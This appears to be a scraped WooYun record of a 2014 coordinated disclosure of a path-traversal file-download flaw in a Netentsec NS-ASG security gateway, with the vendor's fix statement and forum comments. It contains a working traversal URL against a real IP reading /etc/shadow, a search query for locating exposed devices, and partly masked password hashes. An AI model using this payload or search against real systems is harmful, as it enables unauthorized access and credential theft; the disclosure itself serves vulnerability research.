{"id": 2620, "wybug_id": "wooyun-2014-058838", "wybug_title": "网康 NS-ASG 应用安全网关所有版本任意文件下载漏洞", "wybug_corp": "网康科技", "wybug_author": "狗狗侠", "wybug_date": "2014-04-29 10:34", "wybug_open_date": "2014-07-28 10:36", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-28：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 剑总  疯狗叔叔 等待你们的通用型奖励... 详细说明：  剑总  疯狗叔叔 等待你们的通用型奖励...如果这蛋给力，接下来会发布一个该系统的getshell。。。该漏洞利用：     目前通杀...    无需登录状态下，即可下载服务器任何文件，包含/etc/shadow   通过下载shadow  即可破解密码，直接ssh搞起。。。然后网康的菊花就巴拉巴拉的。。。    https://211.68.223.12/commonplugin/Download.php?licensefile=../../../../../../../../../../etc/shadow  如果要验证：请谷歌关键字：“ intitle:网康 NS-ASG 应用安全网关”    操蛋的乌云居然不能发图了。。。 \nob_start(\"\");\theader(\"Expires: Sat, 01 Jan 2000 00:00:00 GMT\");\theader(\"Last-Modified: \".gmdate(\"D, d M Y H:i:s\").\" GMT\");\theader(\"Pragma: public\");\theader(\"Expires: 0\");\theader(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");\theader(\"Cache-Control: public\");\theader(\"Content-Description: File Transfer\");\tsession_cache_limiter(\"must-revalidate\");\tinclude(\"include/common.inc\");//\tinclude(\"include/sslcommon.inc\");//\t$filename = basename($reqfile, '.req');\tif($reqfile)\t{\t\t$filename = $reqfile;\t\t$file = fopen($reqfile,\"rb\");        \tif ($file == FALSE)\t        {                \tdb_close($dbh);\t\t\t\t\t\t\t\t\techo \"<script>\";\t\t\t\t\t\t\t\t\techo \"alert('文件找不到');\";\t\t\t\t\t\t\t\t\techo \"</script>\";\t                exit();        \t}\t}\telse if($certfile)\t{\t\t$filename = $certfile;\t\t$file = fopen($certfile,\"rb\");                if ($file == FALSE)                {\t\t\t\t\t\t\t\t\tdb_close($dbh);\t\t\t\t\t\t\t\t\techo \"<script>\";\t\t\t\t\t\t\t\t\techo \"alert('文件找不到');\";\t\t\t\t\t\t\t\t\techo \"</script>\";\t\t\t\t\t\t\t\t\texit();                }\t}\telse if($licensefile)\t{\t\t$licensepath = \"/Isc/\".$licensefile; //漏洞触发点....网康的研发是不是有点操蛋？ 学学绿盟ok?                $filename = $licensefile;                $file = fopen($licensepath,\"rb\");                if ($file == FALSE)                {\t\t\tdb_close($dbh);\t\t\techo \"<script>\";\t\t\techo \"alert('文件找不到');\";\t\t\techo \"</script>\";        \t\texit();                }        }    Header(\"Content-type:   application/octet-stream\\n\");    Header(\"Content-Disposition:   attachment;   filename=\".$filename);    fpassthru($file);    flush();    fclose($file);\tob_end_flush();\n漏洞证明： root:$1$wW80bXKS$YON*****5UDS1vOJ8oR/:15238:0:99999:7::: //打码nobody:x:14048:0:99999:7:::sshd:!:14055:0:99999:7:::mysql:!:14067:0:99999:7:::smmsp:!:14069:0:99999:7:::fcron:!:14069:0:99999:7:::support:$1$HUC0D.6a$vKlYa7***6FTnNMa1:14096:0:99999:7::: //打码daemon:!:15207:0:99999:7:::   漏洞证明：  \n\n   修复方案：  这个修复估计也修复不完了。。我得深入...   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-01 21:58 厂商回复： 4月29日，网康收到CNVD漏洞细节通知，迅速启动并同时展开了以下工作：1.进一步验证漏洞细节，目前已确认所曝漏洞确实存在于ASG产品；2.对全线产品进行安全自查，重点确认ASG产品是否仍存其它未知漏洞，并验证类似漏洞是否同存于其它产品线，截至目前，自查工作仍在进行中，全线产品暂未发现新的漏洞；3.开发用于漏洞修补的更新程序，将尽快发布应急补丁包，介时用户可通过操作设备管理界面直接安装该更新程序以对所曝漏洞进行应急性修补；4.售后服务部通过内部CRM系统导出全部ASG用户名单，并开始逐一联系用户通报漏洞情况，补丁包发布后，将再次逐一通知所有用户及时安装更新，此项工作预计3工作日内完成；5.为避免统计疏漏，工程部于4月30日16:00向CNVD共享了在线ASG设备的辨识方法，将配合CNVD共同开展在线设备的主动探测工作，一旦发现未更新补丁的在线设备，将联系并协助用户及时更新，此项工作预计10工作日内完成；6.将尽快向社会开放漏洞提交邮箱，接受第三方机构、白帽子及其它组织、个人向网康提交产品漏洞，向所有帮助网康产品进步的组织和人士表示感谢。 最新状态： 2014-07-15：已随版本更新解决  ", "replys": "漏洞评价：\n评论\n     2014-04-29 10:59 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  用这个漏洞，也能给设备内部源码给拖出来吧。。。    \n     2014-04-29 11:21 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @疯狗 那不就对么 买网康的防火墙死一片 等待奖金 疯狗叔叔    \n     2014-04-29 11:32 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @狗狗侠 你们是一个家族得 应该快吧    \n     2014-04-29 11:36 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @xsser 啥家族啊 剑总    \n     2014-04-29 11:38 |    \t\tTea \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:37        | Can't We Be Young.)\t\t \n  @狗狗侠 ....多么明显...多么痛的领悟...    \n     2014-04-29 12:24 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @狗狗侠 狗族啊....    \n     2014-04-29 14:07 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  我好像也看到了点什么~~@疯狗 @狗狗侠 啊~多么痛的领悟    \n     2014-04-29 14:27 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这怎么还攀亲论辈了，这有连带亲属血缘关系    \n     2014-04-29 14:44 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-04-29 16:33 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  狗狗- - 哈哈~    \n     2014-07-28 12:17 |    \t\txyang \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:51        | stay hungry stay foolish)\t\t \n  哈哈 剑总调皮了    \n     2014-08-09 10:31 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  为什么大家都那么牛逼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}